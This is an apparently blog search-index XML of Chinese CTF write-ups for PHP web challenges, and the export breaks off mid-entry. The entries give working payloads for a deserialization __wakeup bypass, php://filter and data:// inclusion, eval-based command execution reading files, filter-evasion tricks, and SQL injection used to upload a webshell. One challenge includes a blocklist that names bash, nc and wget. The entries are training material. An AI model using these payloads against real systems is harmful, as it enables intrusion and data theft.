<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>ACTF2020 新生赛BackupFile 1</title>
      <link href="/2022/05/14/ACTF2020-BackupFile/"/>
      <url>/2022/05/14/ACTF2020-BackupFile/</url>
      
        <content type="html"><![CDATA[<p>这种题目看标题backupfile，之前在攻防世界做过类似的题目直接跟上&#x2F;index.php.bak拿到文件</p><p>进行代码审计</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">include_once</span> <span class="token string">"flag.php"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'key'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'key'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">"Just num!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token string">"123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$key</span> <span class="token operator">==</span> <span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"Try to find out source file!"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发现一个没有见过的intval()函数，万能百度</p><p><img src="https://s2.loli.net/2022/05/15/DCIF8ayZduSen3M.png"></p><p>可以注意到is_numeric函数进行判断是否是数字，比较的时候使用的是&#x3D;&#x3D;，弱类型比较，在比较的过程中因为$key是数字，所以str也会被隐性地转换成整型，即123,直接构造payload</p><pre><code>/?key=123</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 备份文件 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>极客大挑战 2019PHP 1</title>
      <link href="/2022/05/14/php1/"/>
      <url>/2022/05/14/php1/</url>
      
        <content type="html"><![CDATA[<p>打开题目看见猫猫的动画，非常的简陋（bushi）大佬制作的动画还是很强</p><p><img src="https://s2.loli.net/2022/05/15/19agnTkZNpbCM6u.png"></p><p>按F12没有任何提示，看见题目说的备份文件，就直接去扫了目录，发现了<code>www.zip</code>，直接去访问下载了网站源码</p><p><img src="https://s2.loli.net/2022/05/15/FXqgWCYipZLsEca.png"></p><p><del>直接打开flag.php好拿到flag本题结束</del></p><p>怎么可能这么简单发现flag很明显就是假的，接下里就开始分析源码吧</p><p><img src="https://s2.loli.net/2022/05/15/yBMikTZsj7Wa4tX.png">这里加载了一个class.php文件，然后采用get传递一个select参数，随后将之反序列化</p><p>我们接着打开class.php，很好非常多，看着就头大</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">include</span> <span class="token string">'flag.php'</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Name</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string">'nonono'</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string">'yesyes'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token string">'guest'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span> <span class="token operator">!=</span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">"&lt;/br>NO!!!hacker!!!&lt;/br>"</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string">"You name is: "</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;/br>"</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string">"You password is: "</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;/br>"</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span> <span class="token operator">===</span> <span class="token string">'admin'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">global</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">"&lt;/br>hello my friend~~&lt;/br>sorry i can't give you the flag!"</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>根据代码的可以知道，如果password&#x3D;100，username&#x3D;admin，在执行__destruct()的时候可以获得flag，我就直接去构造反序列化:</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">Name</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string">'nonono'</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string">'yesyes'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Name</span><span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到结果</p><pre><code>O:4:&quot;Name&quot;:2:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;</code></pre><p>在反序列化的时候会首先执行<code>__wakeup()</code>魔术方法，这个方法会把我们的username重新赋值，当属性个数的值大于实际属性个数时，会跳过 __wakeup()函数的执行，从而修改为如下</p><pre><code>O:4:&quot;Name&quot;:3:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;</code></pre><p>private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，类名和字段名前面都会加上%00的前缀，再次改造序列化后得到如下</p><pre><code>O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125;</code></pre><p>直接构造payload</p><pre><code>/?select=O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125;</code></pre><p>直接拿到flag</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFHUB-信息泄漏</title>
      <link href="/2022/05/14/CTFHUB_information-leakage/"/>
      <url>/2022/05/14/CTFHUB_information-leakage/</url>
      
        <content type="html"><![CDATA[<h2 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a><em><strong>目录遍历</strong></em></h2><p>看到题目我们一个一个找就找到答案</p><h2 id="PHPINFO"><a href="#PHPINFO" class="headerlink" title="PHPINFO"></a><em><strong>PHPINFO</strong></em></h2><p>直接command+F（Windows是control+F）搜索flag直接拿到</p><h2 id="备份文件下载"><a href="#备份文件下载" class="headerlink" title="备份文件下载"></a><em><strong>备份文件下载</strong></em></h2><h3 id="网站源码"><a href="#网站源码" class="headerlink" title="网站源码"></a><em><strong>网站源码</strong></em></h3><p>直接扫后台，下载源码，打开flag发现没有，直接去访问拿到flag</p><h3 id="bak文件"><a href="#bak文件" class="headerlink" title="bak文件"></a><em><strong>bak文件</strong></em></h3><p>看到题目我们直接访问index.php.bak下载打开拿到flag</p><h3 id="vim缓存"><a href="#vim缓存" class="headerlink" title="vim缓存"></a><em><strong>vim缓存</strong></em></h3><p>没做过这种题，访问index.php看源码什么都没有，好的直接扫一下后台，看看有没有什么地方可以访问拿到源码，很好什么都没扫出来。我选择百度了解到vim在编辑文档的过程中如果异常退出，会产生缓存文件，第一次产生的缓存文件后缀为.swp，后面会产生swo等。尝试访问index.php.swp和index.php.swo发现都是404直接疑惑，后面才知道要访问.index.php.swp(index前面要加个’.’)下载下来发现是二进制文件，打开全是乱码，试图vim打开编辑，直接崩掉自己的终端笑死。后面才知道要用如下指令打开拿到flag.</p><p><img src="https://s2.loli.net/2022/05/15/pxTg2zJCqIEsY7o.png"></p><h3 id="DS-Store"><a href="#DS-Store" class="headerlink" title=".DS_Store"></a><em><strong>.DS_Store</strong></em></h3><p>看到题目描述macos，在自己电脑上找了一下，没找到哈哈哈。</p><p>没有思路 开扫目录（其他的题目别乱扫）蚌埠住了什么也没有</p><p>没有思路 直接百度发现别人的dirsearch就能扫出来麻掉了，打开发现打不开，用指令cat 抓取发现flag is here去网站访问这个txt文件（一开始全部输入发现404）拿到flag</p><h2 id="Git泄漏"><a href="#Git泄漏" class="headerlink" title="Git泄漏"></a><em><strong>Git泄漏</strong></em></h2><h3 id="Log"><a href="#Log" class="headerlink" title="Log"></a><em><strong>Log</strong></em></h3><p>题目描述说了GitHack给了思路，用指令python GitHack.py <url>然后cd到dist文件夹里的对应网站文件夹 git log看到过去</p><p><img src="https://s2.loli.net/2022/05/15/ZMON9baQwYKBkqx.png">发现中间add flag</p><p>用git reset –hard 37ebed6(可不输完整)将文件夹里的文件到过去的版本中</p><p><img src="https://s2.loli.net/2022/05/15/G5FWAc7sI4dBuVK.png"></p><p>打开文件夹发现txt文件打开就拿到了flag</p><h3 id="Stash"><a href="#Stash" class="headerlink" title="Stash"></a><em><strong>Stash</strong></em></h3><p>用GitHack工具扫描后</p><h4 id="法1"><a href="#法1" class="headerlink" title="法1"></a>法1</h4><pre><code>cat .git/refs/stash  //来得到stash对应的hash值用git diff &lt;hash&gt;    //拿到flag</code></pre><h4 id="法2"><a href="#法2" class="headerlink" title="法2"></a>法2</h4><pre><code>git stash list    //拿到listgit stash pop    //从 git 栈中弹出来一个文件cat &lt;对应txt文件&gt;  //拿到flag</code></pre><h4 id="法3"><a href="#法3" class="headerlink" title="法3"></a>法3</h4><pre><code>git stash         git stash apply  //恢复，即可获得 Flag 文件cat &lt;对应txt文件&gt;  //拿到flag</code></pre><h3 id="Index"><a href="#Index" class="headerlink" title="Index"></a><em><strong>Index</strong></em></h3><h4 id="法1-1"><a href="#法1-1" class="headerlink" title="法1"></a>法1</h4><p>同上方log即可拿到flag</p><h4 id="法2-1"><a href="#法2-1" class="headerlink" title="法2"></a>法2</h4><p>用git checkout 看到文件名在用git checkout &lt;文件名&gt;拿到flag</p><p>命令解释</p><p>创建新分支：git branch branchName</p><p>切换到新分支：git checkout branchName</p><h2 id="SVN泄漏"><a href="#SVN泄漏" class="headerlink" title="SVN泄漏"></a><em><strong>SVN泄漏</strong></em></h2><p>SVN泄露又一次到了我的知识盲区  <a href="https://github.com/kost/dvcs-ripper">工具</a>里的工具，看了一下下面的使用教程，直接麻掉，找到我们这道题SVN泄漏</p><p><img src="https://s2.loli.net/2022/05/15/rT1MIwnfABZKcbV.png"></p><p>用指令直接来！mac用如下指令</p><pre><code>./rip-svn.pl  &lt;url&gt;</code></pre><p><img src="https://s2.loli.net/2022/05/15/Jew2F3Kjbk4zX1D.png"></p><p>用ls -a看见隐藏文件</p><p><img src="https://s2.loli.net/2022/05/15/9cOhPrLb1EelV5M.png"></p><p>cd .svn 到文件  ls </p><p><img src="https://s2.loli.net/2022/05/15/WmlpoC5NMy4VGXd.png"></p><p>cd pristine   然后ls </p><p><img src="https://s2.loli.net/2022/05/15/g5PMtjrYhxReNBA.png"></p><p>cd bf     然后ls 再用cat指令拿到文件内容发现是网站的原来的源码</p><p>重新 cd d0  ls  然后cat文件  拿到flag</p><p>也可以用tree指令查看</p><h2 id="HG泄漏"><a href="#HG泄漏" class="headerlink" title="HG泄漏"></a><em><strong>HG泄漏</strong></em></h2><p><a href="https://github.com/kost/dvcs-ripper">工具</a></p><p>tree .hg看到如下</p><p><img src="https://s2.loli.net/2022/05/15/txGhNyQU1Jfmpd5.png"></p><p>cd .hg&#x2F;store   然后cat fncache  拿到如下 直接访问&#x2F;flag_401618203.txt即可拿到flag</p><p><img src="https://s2.loli.net/2022/05/15/IPizkNm34apchb8.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 备份文件 </tag>
            
            <tag> git 泄漏 </tag>
            
            <tag> SVN 泄漏 </tag>
            
            <tag> HG 泄漏 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFHUB-WEB前置技能</title>
      <link href="/2022/05/14/CTFHUB_prerequisite-skills/"/>
      <url>/2022/05/14/CTFHUB_prerequisite-skills/</url>
      
        <content type="html"><![CDATA[<h2 id="请求方式"><a href="#请求方式" class="headerlink" title="请求方式"></a><em><strong>请求方式</strong></em></h2><p><img src="https://s2.loli.net/2022/05/15/5habHieW27Tly1g.png"></p><p>翻译一下：</p><p>HTTP 方法是 GET</p><p>使用CTFHUB方法，我给你flag。</p><p>提示：如果你遇到「HTTP Method Not Allowed」错误，你应该请求 index.php。</p><p>非常明显，直接burp抓包该请求方式为CTFHUB就拿到flag</p><h2 id="302跳转"><a href="#302跳转" class="headerlink" title="302跳转"></a><em><strong>302跳转</strong></em></h2><p><img src="https://s2.loli.net/2022/05/15/3gurKsYONPFqpwk.png"></p><p>疯狂点击“Give me Flag” 没有任何的反应，看到题目302跳转（302重定向又称之为暂时性转移）直接burp抓包一个包一个包的放到repeater里来看，就能发现flag</p><h2 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a><em><strong>Cookie</strong></em></h2><p>网页显示：我是访客只有admin能够拿到flag，题目cookie直接F12找到cookie，把admin的值改成1拿到flag</p><h2 id="基本认证"><a href="#基本认证" class="headerlink" title="基本认证"></a><em><strong>基本认证</strong></em></h2><p>打开发现有个“click”点一下发现弹出验证框，题目有个附件给了弱口令，直接burp抓包爆破。但是看见请求头里什么参数没有显示仔细看看发现</p><p><img src="https://s2.loli.net/2022/05/15/iNV5HvaJ7QebWKZ.png"></p><p>这里有个授权书，后面看不懂，感觉像是什么加密后的，有大写，感觉没有等号，不像base64（笑死结果就是），到处试，最后base64 解密出来是</p><p><img src="https://s2.loli.net/2022/05/15/CdR58zqhOEKaZVt.png"></p><p>就是我自己输入的账号和密码，用burp的爆破功能</p><p><img src="https://s2.loli.net/2022/05/15/lHoFtfAdNhUD785.png"></p><p><img src="https://s2.loli.net/2022/05/15/2jkvSONiUHDsYab.png"><strong>这里直接上传题目给的附件</strong></p><p><img src="https://s2.loli.net/2022/05/15/Z8CwijMhoeEDYgP.png"></p><p>这里我试图直接爆破，但是什么结果都没有仔细直接发包试了一下</p><p><img src="https://s2.loli.net/2022/05/15/IvfVGNYL3K67qWU.png">账户很有可能就是admin</p><p><img src="https://s2.loli.net/2022/05/15/DiWBF3sfQPGT5SC.png">添加前缀:”admin:”   用户名设置为admin</p><p><img src="https://s2.loli.net/2022/05/15/Zy7A6UfeYSWvPaJ.png">base64编码</p><p>开始爆破就可以拿到flag</p><h2 id="响应包源码"><a href="#响应包源码" class="headerlink" title="响应包源码"></a><em><strong>响应包源码</strong></em></h2><p>F12拿到flag</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SWPUCTF 2021 新生赛</title>
      <link href="/2022/05/14/SWPUCTF_freshman-match/"/>
      <url>/2022/05/14/SWPUCTF_freshman-match/</url>
      
        <content type="html"><![CDATA[<p>部分题目WP</p><h2 id="PseudoProtocols-伪协议"><a href="#PseudoProtocols-伪协议" class="headerlink" title="PseudoProtocols(伪协议)"></a><strong>PseudoProtocols</strong>(伪协议)</h2><p>看到题目就是伪协议   直接用下面代码查看hint.php</p><pre><code>?wllm=php://filter/read=convert.base64-encode/resource=hint.php</code></pre><p>base64解码后看见</p><pre><code>&lt;?php//go to /test2222222222222.php?&gt;</code></pre><p>直接访问出现下列代码</p><pre><code>&lt;?phpini_set(&quot;max_execution_time&quot;, &quot;180&quot;);show_source(__FILE__);include(&#39;flag.php&#39;);$a= $_GET[&quot;a&quot;];if(isset($a)&amp;&amp;(file_get_contents($a,&#39;r&#39;)) === &#39;I want flag&#39;)&#123;    echo &quot;success\n&quot;;    echo $flag;&#125;?&gt;</code></pre><p>第一种解法用下面的payload就可以得到flag</p><pre><code>?a=data://text/plain,I want flag</code></pre><p>第二种解法</p><pre><code>?a=php://input</code></pre><p>用burp  POST传参也能得到flag</p><p><img src="https://s2.loli.net/2022/05/15/dsHFWywYONq2LMp.png"></p><h2 id="include"><a href="#include" class="headerlink" title="include"></a><strong>include</strong></h2><p>直接由题意传file    直接?file&#x3D;1</p><p><img src="https://s2.loli.net/2022/05/15/eDBxHYfQFMbz2uN.png"></p><p>“allow_url_include”，”on”意味存在着文件包含漏洞  payload如下  也可查看<a href="https://segmentfault.com/a/1190000018991087">php伪协议</a></p><pre><code>?file=php://filter/read=convert.base64-encode/resource=flag.php</code></pre><p><img src="https://s2.loli.net/2022/05/15/DwGZmnfPHuSzTq1.png"></p><p>再进行base64解码得到flag</p><h2 id="RCE部分"><a href="#RCE部分" class="headerlink" title="RCE部分"></a><strong>RCE部分</strong></h2><h3 id="easyrce"><a href="#easyrce" class="headerlink" title="easyrce"></a><strong>easyrce</strong></h3><p>源码</p><pre><code>&lt;?phperror_reporting(0);highlight_file(__FILE__);if(isset($_GET[&#39;url&#39;]))&#123;eval($_GET[&#39;url&#39;]);&#125;?&gt;</code></pre><p>有eval 但是是get传参 将传入的内容作为php代码执行 利用php可以执行Linux命令</p><p>用下列payload查看根目录</p><pre><code>?url=system(&#39;ls /&#39;);</code></pre><p><img src="https://s2.loli.net/2022/05/15/OukxLdMYW93ZaoQ.png"></p><p>发现在根目录下  直接cat指令读取文件  拿到flag</p><pre><code>?url=system(&#39;cat /flllllaaaaaaggggggg&#39;);</code></pre><h3 id="babyrce"><a href="#babyrce" class="headerlink" title="babyrce"></a><strong>babyrce</strong></h3><p>源码：</p><pre><code>&lt;?phperror_reporting(0);header(&quot;Content-Type:text/html;charset=utf-8&quot;);highlight_file(__FILE__);if($_COOKIE[&#39;admin&#39;]==1) &#123;    include &quot;../next.php&quot;;&#125;else    echo &quot;小饼干最好吃啦！&quot;;?&gt; 小饼干最好吃啦！</code></pre><p>看见题目 cookie传参，键名为admin，值为1，直接传</p><p><img src="https://s2.loli.net/2022/05/15/ns2AIqJNZ9OrdTc.png"></p><p>发现rasalghul.php我们去访问</p><pre><code>&lt;?phperror_reporting(0);highlight_file(__FILE__);error_reporting(0);if (isset($_GET[&#39;url&#39;])) &#123;  $ip=$_GET[&#39;url&#39;];  if(preg_match(&quot;/ /&quot;, $ip))&#123;      die(&#39;nonono&#39;);   //这里过滤了空格 如果 用到了空格输出nonono  &#125;  $a = shell_exec($ip);  echo $a;&#125;?&gt;</code></pre><p>我们可以用其他符号代替$IFS、IFS$9、%09具体可以百度</p><p>直接看根目录  发现 flag  </p><p><img src="https://s2.loli.net/2022/05/15/ZmyugPC1AJQX9I6.png"></p><p>然后cat 拿到flag</p><p><img src="https://s2.loli.net/2022/05/15/UirzT23vXxMLuRW.png"></p><h3 id="finalyrce"><a href="#finalyrce" class="headerlink" title="finalyrce"></a><strong>finalyrce</strong></h3><pre><code>&lt;?phphighlight_file(__FILE__);if(isset($_GET[&#39;url&#39;]))&#123;    $url=$_GET[&#39;url&#39;];    if(preg_match(&#39;/bash|nc|wget|ping|ls|cat|more|less|phpinfo|base64|echo|php|python|mv|cp|la|\-|\*|\&quot;|\&gt;|\&lt;|\%|\$/i&#39;,$url))    &#123;        echo &quot;Sorry,you can&#39;t use this.&quot;;    &#125;    else    &#123;        echo &quot;Can you see anything?&quot;;        exec($url);    &#125;&#125;</code></pre><p>这道题就过滤了很多字符   通过<a href="https://www.runoob.com/linux/linux-comm-tee.html">Linux tee命令</a>写入文件 用dir &#x2F; | tee guxi可以在当前目录下生成guxi文件</p><p>然后去访问url&#x2F;guxi就可以访问guxi文件</p><p><img src="https://s2.loli.net/2022/05/15/SbpIiMAmDntJqTO.png"></p><p>找到flag  可以用tac代替cat命令  发现直接读取不行   仔细代码审计发现过滤了la没有过滤?我们可以用?代替字母即可</p><p><img src="https://s2.loli.net/2022/05/15/ifIbCKlPdZozrcn.png"></p><p>然后再访问guxi文件就能看见flag</p><p><img src="https://s2.loli.net/2022/05/15/G8anzRiSHvUb7Z4.png"></p><h3 id="hardrce"><a href="#hardrce" class="headerlink" title="hardrce"></a><strong>hardrce</strong></h3><p>源码:</p><pre><code>&lt;?phpheader(&quot;Content-Type:text/html;charset=utf-8&quot;);error_reporting(0);highlight_file(__FILE__);if(isset($_GET[&#39;wllm&#39;]))&#123;    $wllm = $_GET[&#39;wllm&#39;];    $blacklist = [&#39; &#39;,&#39;\t&#39;,&#39;\r&#39;,&#39;\n&#39;,&#39;\+&#39;,&#39;\[&#39;,&#39;\^&#39;,&#39;\]&#39;,&#39;\&quot;&#39;,&#39;\-&#39;,&#39;\$&#39;,&#39;\*&#39;,&#39;\?&#39;,&#39;\&lt;&#39;,&#39;\&gt;&#39;,&#39;\=&#39;,&#39;\`&#39;,];    foreach ($blacklist as $blackitem)    &#123;        if (preg_match(&#39;/&#39; . $blackitem . &#39;/m&#39;, $wllm)) &#123;        die(&quot;LTLT说不能用这些奇奇怪怪的符号哦！&quot;);    &#125;&#125;if(preg_match(&#39;/[a-zA-Z]/is&#39;,$wllm))&#123;    die(&quot;Ra&#39;s Al Ghul说不能用字母哦！&quot;);&#125;echo &quot;NoVic4说：不错哦小伙子，可你能拿到flag吗？&quot;;eval($wllm);&#125;else&#123;    echo &quot;蔡总说：注意审题！！！&quot;;&#125;?&gt; 蔡总说：注意审题！！！</code></pre><p>打开题目 我直接人麻了  过滤了很多  但仔细看有一个符号没有被过滤“~”取反符号</p><p>具体可查看<a href="https://blog.csdn.net/WilliamsWayne/article/details/78259501">此文章</a></p><p>百度用php在线工具   直接取反命令</p><p><img src="https://s2.loli.net/2022/05/15/5prIwVCvGzoiKU3.png"></p><p>查看到了根目录 </p><p><img src="https://s2.loli.net/2022/05/15/ZhM9e5Hz2Vrj6Uy.png"></p><p>在取反cat命令</p><p><img src="https://s2.loli.net/2022/05/15/an5mp489BQt3L2z.png"></p><p>直接拿到flag</p><p><img src="https://s2.loli.net/2022/05/15/FThj4ElRCK9rVwL.png"></p><p>还有一道我太菜了 写不来</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> RCE </tag>
            
            <tag> php伪协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XDCTF 2015Filemanager</title>
      <link href="/2022/05/14/XDCTF_2015_Filemanager/"/>
      <url>/2022/05/14/XDCTF_2015_Filemanager/</url>
      
        <content type="html"><![CDATA[<p>拿到题目  以为是文件上传简单题目 后面多次碰壁发现一点也不简单！</p><p><img src="https://s2.loli.net/2022/05/14/fEat6CbZweg8Oyh.png"></p><p>我们看见rename部分  想通过rename更改文件后缀  但这里显示只包含文件名称</p><p><img src="https://s2.loli.net/2022/05/14/uHxzE7cW4VXbrKN.png"></p><p>试图寻找源码  通过dirserarch扫描  我们找到了一个&#x2F;<a href="http://www.tar.gz/">www.tar.gz</a>  访问下载网站源码</p><p><img src="https://s2.loli.net/2022/05/14/bV3WcYn2tNLIEOe.png"></p><p>仔细进行代码审计  首先由白名单限制  我们只能上传如下后缀文件</p><p><img src="https://s2.loli.net/2022/05/14/H6X5JgKNx4mO8qc.png"></p><p>下面这段代码 发现其将被修改的旧文件名的扩展名保留到新文件名的扩展名上</p><p><img src="https://s2.loli.net/2022/05/14/B8VfcYEb4H5WFrL.png"></p><p>通过同队web佬<a href="https://www.c1c.ink/">C1c</a>的讲解想到了SQL注入使其文件扩展为空然后进行更改文件名 </p><p>我们看见下面的update语句</p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$re</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"update `file` set `filename`='{$req['newname']}', `oldname`='{$result['filename']}' where `fid`={$result['fid']}"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>想去闭合文件名    使得下面的$result[“extension”]为空直接进行如下构造</p><p>名字构造为’,extension&#x3D;’.jpg     使其进行闭合</p><p><img src="https://s2.loli.net/2022/05/14/1GYdaDoJZybvQNu.png"></p><p>后台得到如下闭合</p><p><img src="https://s2.loli.net/2022/05/14/cS4zZwexjEfrROy.png"></p><p>然后修改名字   这一步利用updata语句直接将1.jpg.___后缀为空,只有1.jpg的文件名被传入数据库）</p><p>此时该文件的extension为空</p><p><img src="https://s2.loli.net/2022/05/14/BuaxsdRC1PWpAEh.png"></p><p><img src="https://s2.loli.net/2022/05/14/VdE5BFM4hLxyOXc.png"></p><p>然后我们再上传带有木马的1.jpg文件  因为数据库里的为1.jpg.jpg 故没有相同的文件可以上传</p><p><img 